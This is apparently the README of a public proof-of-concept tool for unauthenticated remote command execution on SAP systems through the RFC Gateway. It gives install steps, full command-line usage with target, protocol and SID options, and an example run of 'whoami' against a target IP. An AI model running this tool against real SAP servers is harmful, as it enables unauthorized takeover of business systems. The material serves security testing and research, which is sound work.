# SAP RFC Gateway RCE

This POC is based on the original research from @chipik and @gelim which can be found in the [their Github repository](https://github.com/chipik/SAP_GW_RCE_exploit)

The script leverages an intented functionality by the SAP RFC Gateway which leads to a unauthenticated Remote Command Execution on the SAP Server.

> [!WARNING]
> Make sure you have the appropriate permissions to actively scan and test applications. Without doing so, you might face legal implications

This tool has been tested and Developed by using the following Systems:
- SAP S/4 HANA 2023 (A4H - SAP Developer Edition) (Linux)
- SAP S/4 HANA 2022 (A4H - SAP Developer Edition) (Linux)
- SAP NetWeaver 7.52 (NPL - SAP Developer Edition) (Linux)
- Solution Manager 7.52 (Windows)

# Installation
- Optional dependencies (required for long command output)
```bash
pip3 install pysap
````

- Download the tool
```bash
git clone https://github.com/randomstr1ng/SAP-RFC-Gateway-RCE.git
```

# Usage
```bash
python3 SAPanonGWv3.py -h
usage: SAPanonGWv3.py [-h] -t IP [-p PORT] [-c CMD] [--protocol {modern,legacy}] [-s SID] [--appserver HOSTNAME] [-v] [-d]

SAP RFC Gateway Remote Command Execution (v3)

options:
  -h, --help            show this help message and exit
  -t IP, --ip IP        Target SAP system IP
  -p PORT, --port PORT  Gateway port (default: 3300)
  -c CMD, --cmd CMD     Command to execute (default: whoami)
  --protocol {modern,legacy}
                        Target SAP kernel protocol (default: modern)
                          modern  - S/4HANA systems (kernel 758/793)
                          legacy  - Classic NW7.52 / R/3 systems
  -s SID, --sid SID     SAP System ID of the target (3 chars).
                        Default: A4H (modern) or NPL (legacy)
  --appserver HOSTNAME  Application server hostname for TH routing.
                        Default: vhcala4hci (modern) or npl-sxpg (legacy).
                        Must match the app server registered on the target gateway.
                        Example: --sid NW7 --appserver myhost
  -v, --verbose         Show connection steps and session details
  -d, --debug           Show hex dumps of all packets
```

## Example
```bash
$ python3 SAPanonGWv3.py -t 10.20.30.15 -p 3300 -c whoami
a4hadm
```